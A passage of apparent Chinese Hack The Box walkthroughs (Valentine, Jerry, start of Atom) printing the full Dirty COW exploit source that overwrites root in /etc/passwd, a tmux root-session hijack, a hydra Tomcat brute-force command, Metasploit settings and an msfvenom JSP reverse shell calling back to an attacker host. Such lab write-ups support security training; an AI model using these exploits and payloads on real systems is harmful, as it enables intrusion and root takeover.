<p>访问其web服务的时候，就只有一张图片，查看代码源码啥的都没有，但是这张图片的心脏在滴血，我们不难猜到是心脏滴血漏洞吧<br><img src="https://img-blog.csdnimg.cn/d9abb29e5cc84619b8c2c6942db20ce4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那么我们想用脚本检测一下是否存在心脏滴血漏洞，这里有两种方法检测这个漏洞，一种是使用<code>heartbleed.py</code>这个python脚本，另一种是使用nmap自带的nse脚本检测<br><img src="https://img-blog.csdnimg.cn/59444c0ee5d544d298302502fd349bb4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/49fbb69ace90495f904853d28bb58c96.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>我们发现了一段base64的加密信息<code>$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==</code>，解码发现明文是<code>heartbleedbelievethehype</code>，不知道是什么，先留着或许后面有用。<br><img src="https://img-blog.csdnimg.cn/c2499b79b1d24bf5b41b4827e80eab52.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>目前来说没啥可利用的信息了，我们进行扫一波目录吧。发现了三个可访问的目录<br><img src="https://img-blog.csdnimg.cn/921fb947413e49f9835045472777f608.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>dev目录下，我们发现了一个<code>hype_key</code>和<code>notes.txt</code>这两个文件<br><img src="https://img-blog.csdnimg.cn/aca3b9d5338b426880717055af939c05.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_18,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>打开hype_key发现是一堆十六进制的字符，我们解码之后发现是一个私钥<br><img src="https://img-blog.csdnimg.cn/ca8014a8611e4285a8dcc55497aee1f6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="https://img-blog.csdnimg.cn/b2d08002b1724754a58cebb6117ef1b6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后我们发现之前不是有一个类似密码的字符串的吗。我们尝试登陆，并且成功了，我们可以查看到user.txt文件内容<br><img src="https://img-blog.csdnimg.cn/2e18c2941c3045edaccc7ebcbcdc2db3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/afb0ff3e8d0145d9bf0d2a26c4608e2b.png" alt="在这里插入图片描述"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这里我们开启一个服务器，上传<code>linpeas.sh</code>这个脚本到目标机器上，这个脚本功能非常强大，是专门针对Linux提权的一个脚本工具。它是由Carlos P创建的，目的是列举在Linux系统上提升特权的所有可能方法。<br><img src="https://img-blog.csdnimg.cn/d6d15cb2cccf4a7fa46092fd5a3db58e.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/06085062db3d40459a5ecef0a53d7a13.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>赋予执行权限并运行这个脚本，这里有两种提权的方法，一种是脏牛提权，这个简单快捷；另一种利用<code>tmux</code>这个应用程序来实施提权。</p>
<h3 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h3><p>这里我们发现这个Linux版本较低，那么我们可以使用脏牛进行提权<br><img src="https://img-blog.csdnimg.cn/d06348beabfc4b279891a1cfc60a32a1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在<code>exploit-db</code>上可以发现利用的脚本<br><img src="https://img-blog.csdnimg.cn/4e45a7c7bc434452b0dbe78a15ff87c1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>这是整个脚本的内容</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This exploit uses the pokemon exploit of the dirtycow vulnerability</span></span><br><span class="line"><span class="comment">// as a base and automatically generates a new passwd line.</span></span><br><span class="line"><span class="comment">// The user will be prompted for the new password when the binary is run.</span></span><br><span class="line"><span class="comment">// The original /etc/passwd file is then backed up to /tmp/passwd.bak</span></span><br><span class="line"><span class="comment">// and overwrites the root account with the generated line.</span></span><br><span class="line"><span class="comment">// After running the exploit you should be able to login with the newly</span></span><br><span class="line"><span class="comment">// created user.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// To use this exploit modify the user values according to your needs.</span></span><br><span class="line"><span class="comment">//   The default is &quot;firefart&quot;.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Original exploit (dirtycow&#x27;s ptrace_pokedata &quot;pokemon&quot; method):</span></span><br><span class="line"><span class="comment">//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Compile with:</span></span><br><span class="line"><span class="comment">//   gcc -pthread dirty.c -o dirty -lcrypt</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Then run the newly create binary by either doing:</span></span><br><span class="line"><span class="comment">//   &quot;./dirty&quot; or &quot;./dirty my-new-password&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// DON&#x27;T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!</span></span><br><span class="line"><span class="comment">//   mv /tmp/passwd.bak /etc/passwd</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Exploit adopted by Christian &quot;FireFart&quot; Mehlmauer</span></span><br><span class="line"><span class="comment">// https://firefart.at</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;crypt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *filename = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *backup_filename = <span class="string">&quot;/tmp/passwd.bak&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *salt = <span class="string">&quot;firefart&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> f;</span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">pthread_t</span> pth;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span> &#123;</span></span><br><span class="line">   <span class="keyword">char</span> *username;</span><br><span class="line">   <span class="keyword">char</span> *hash;</span><br><span class="line">   <span class="keyword">int</span> user_id;</span><br><span class="line">   <span class="keyword">int</span> group_id;</span><br><span class="line">   <span class="keyword">char</span> *info;</span><br><span class="line">   <span class="keyword">char</span> *home_dir;</span><br><span class="line">   <span class="keyword">char</span> *shell;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">generate_password_hash</span><span class="params">(<span class="keyword">char</span> *plaintext_pw)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypt(plaintext_pw, salt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">generate_passwd_line</span><span class="params">(struct Userinfo u)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *format = <span class="string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>;</span><br><span class="line">  <span class="keyword">int</span> size = <span class="built_in">snprintf</span>(<span class="literal">NULL</span>, <span class="number">0</span>, format, u.username, u.hash,</span><br><span class="line">    u.user_id, u.group_id, u.info, u.home_dir, u.shell);</span><br><span class="line">  <span class="keyword">char</span> *ret = <span class="built_in">malloc</span>(size + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(ret, format, u.username, u.hash, u.user_id,</span><br><span class="line">    u.group_id, u.info, u.home_dir, u.shell);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i, c = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">200000000</span>; i++) &#123;</span><br><span class="line">    c += madvise(<span class="built_in">map</span>, <span class="number">100</span>, MADV_DONTNEED);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;madvise %d\n\n&quot;</span>, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *from, <span class="keyword">const</span> <span class="keyword">char</span> *to)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// check if target file already exists</span></span><br><span class="line">  <span class="keyword">if</span>(access(to, F_OK) != <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;File %s already exists! Please delete it and run again\n&quot;</span>,</span><br><span class="line">      to);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> ch;</span><br><span class="line">  FILE *source, *target;</span><br><span class="line"></span><br><span class="line">  source = fopen(from, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(source == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  target = fopen(to, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(target == <span class="literal">NULL</span>) &#123;</span><br><span class="line">     fclose(source);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>((ch = fgetc(source)) != EOF) &#123;</span><br><span class="line">     fputc(ch, target);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s successfully backed up to %s\n&quot;</span>,</span><br><span class="line">    from, to);</span><br><span class="line"></span><br><span class="line">  fclose(source);</span><br><span class="line">  fclose(target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// backup file</span></span><br><span class="line">  <span class="keyword">int</span> ret = copy_file(filename, backup_filename);</span><br><span class="line">  <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">exit</span>(ret);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span> <span class="title">user</span>;</span></span><br><span class="line">  <span class="comment">// set values, change as needed</span></span><br><span class="line">  user.username = <span class="string">&quot;firefart&quot;</span>;</span><br><span class="line">  user.user_id = <span class="number">0</span>;</span><br><span class="line">  user.group_id = <span class="number">0</span>;</span><br><span class="line">  user.info = <span class="string">&quot;pwned&quot;</span>;</span><br><span class="line">  user.home_dir = <span class="string">&quot;/root&quot;</span>;</span><br><span class="line">  user.shell = <span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> *plaintext_pw;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">    plaintext_pw = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the new password: %s\n&quot;</span>, plaintext_pw);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    plaintext_pw = getpass(<span class="string">&quot;Please enter the new password: &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  user.hash = generate_password_hash(plaintext_pw);</span><br><span class="line">  <span class="keyword">char</span> *complete_passwd_line = generate_passwd_line(user);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Complete line:\n%s\n&quot;</span>, complete_passwd_line);</span><br><span class="line"></span><br><span class="line">  f = open(filename, O_RDONLY);</span><br><span class="line">  fstat(f, &amp;st);</span><br><span class="line">  <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>,</span><br><span class="line">             st.st_size + <span class="keyword">sizeof</span>(<span class="keyword">long</span>),</span><br><span class="line">             PROT_READ,</span><br><span class="line">             MAP_PRIVATE,</span><br><span class="line">             f,</span><br><span class="line">             <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;mmap: %lx\n&quot;</span>,(<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="built_in">map</span>);</span><br><span class="line">  pid = fork();</span><br><span class="line">  <span class="keyword">if</span>(pid) &#123;</span><br><span class="line">    waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> u, i, o, c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> l=<span class="built_in">strlen</span>(complete_passwd_line);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10000</span>/l; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span>(o = <span class="number">0</span>; o &lt; l; o++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(u = <span class="number">0</span>; u &lt; <span class="number">10000</span>; u++) &#123;</span><br><span class="line">          c += ptrace(PTRACE_POKETEXT,</span><br><span class="line">                      pid,</span><br><span class="line">                      <span class="built_in">map</span> + o,</span><br><span class="line">                      *((<span class="keyword">long</span>*)(complete_passwd_line + o)));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ptrace %d\n&quot;</span>,c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    pthread_create(&amp;pth,</span><br><span class="line">                   <span class="literal">NULL</span>,</span><br><span class="line">                   madviseThread,</span><br><span class="line">                   <span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_TRACEME);</span><br><span class="line">    kill(getpid(), SIGSTOP);</span><br><span class="line">    pthread_join(pth,<span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Done! Check %s to see if the new user was created.\n&quot;</span>, filename);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You can log in with the username &#x27;%s&#x27; and the password &#x27;%s&#x27;.\n\n&quot;</span>,</span><br><span class="line">    user.username, plaintext_pw);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nDON&#x27;T FORGET TO RESTORE! $ mv %s %s\n&quot;</span>,</span><br><span class="line">    backup_filename, filename);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们将脏牛脚本下载到目标机器上<br><img src="https://img-blog.csdnimg.cn/7be0601d01a245d49b8a950a8e1a4dd1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后编译并运行这个脚本，新设置的密码为空</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -pthread 40389.c -o dirty -lcrypt</span><br><span class="line">./dirty</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/cf62ba35819c4ce38f1c526d9914aeae.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/01e976057cfd436eaf24c2139dbc1cd0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="tmux提权"><a href="#tmux提权" class="headerlink" title="tmux提权"></a>tmux提权</h2><p>除了脏牛，我们还发现以root用户运行的tmux程序<br><img src="https://img-blog.csdnimg.cn/ee02125d05bb444ca867c42b495afc29.png" alt="在这里插入图片描述"><br>那么我们直接运行命令，就能够提权到root上了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/bin/tmux -S /.devs/dev_sess</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/b4674887be004a4a8ba43204d0642eed.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>心脏滴血</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Jerry</title>
    <url>/2021/12/24/Jerry/</url>
    <content><![CDATA[<h2 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h2><p><img src="https://img-blog.csdnimg.cn/d5f1dc82530e485e91e914d59c62f9ff.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>我们可以看到，目标主机只开放了8080端口，而且版本还是<code>7.0.88</code>的<br><img src="https://img-blog.csdnimg.cn/12b2a2ded3544b248ce0ae24e4c30139.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p>我们立马登录tomcat页面，并且尝试账户和密码都是admin，看看能不能登录成功，结果是失败的。<br><img src="https://img-blog.csdnimg.cn/14569a31b1e04d76855654582e15e833.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/a1c59a404d30477d9434d5ca81214227.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们下载<code>seclists</code>这个工具，对tomcat的默认用户名和密码进行暴力破解<br><img src="https://img-blog.csdnimg.cn/4573275f27314e41997be90a187c528b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>我们使用hydra工具对账号密码进行破解，发现账号是tomcat，密码是s3cret</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http://10.10.10.95:8080/manager/html</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/2e489a5e1395436f87bbc2c1c05db04b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h3 id="MSF获取权限"><a href="#MSF获取权限" class="headerlink" title="MSF获取权限"></a>MSF获取权限</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search tomcat_mgr</span><br><span class="line">use exploit/multi/http/tomcat_upload</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> rhosts 10.10.10.95</span><br><span class="line"><span class="built_in">set</span> lhost 10.10.14.11</span><br><span class="line"><span class="built_in">set</span> httpusername tomcat</span><br><span class="line"><span class="built_in">set</span> httppassword s3cret</span><br><span class="line"><span class="built_in">set</span> rport 8080</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/405b1654a30e4fd8b5ff405938d24a51.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们获取一个shell，发现已经是最高权限了<br><img src="https://img-blog.csdnimg.cn/efd9843d30e5431cbe6ae1408fbcb011.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那么我们就可以查看到flag值了<br><img src="https://img-blog.csdnimg.cn/89ecac8618f24fdf9edd6cf96a419036.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h3 id="NC反弹shell"><a href="#NC反弹shell" class="headerlink" title="NC反弹shell"></a>NC反弹shell</h3><p>首先我们先准备一个木马</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.11 lport=1234 -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/c4abdde92c484b46ac8782a2c62da4fa.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们使用账号密码登录进部署页面，并将生成的木马部署进tomcat服务器上<br><img src="https://img-blog.csdnimg.cn/9dd05049c33f45cf971a5f70a9a6d2e8.png" alt="在这里插入图片描述"><br>然后我们启动nc进行监听，并且在浏览器上浏览我们刚刚上传的war包，反弹shell成功。<br><img src="https://img-blog.csdnimg.cn/fbcd897e89c149549ead8a54352163ae.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/488c679d14e64be28972f71dab63504a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>中间件</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Atom</title>
    <url>/2021/12/24/Atom/</url>
    <content><![CDATA[<h2 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h2><p><img src="https://img-blog.csdnimg.cn/d7ff3a26ad1b4b0680f0d4283d757a77.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>可以看到靶机开放了80端口，那证明就存在web服务。<br><img src="https://img-blog.csdnimg.cn/71d80ba7cc3748c4a4f0402a9793083a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/458004df73e046d6ac29665f942ae2a1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<span id="more"></span>

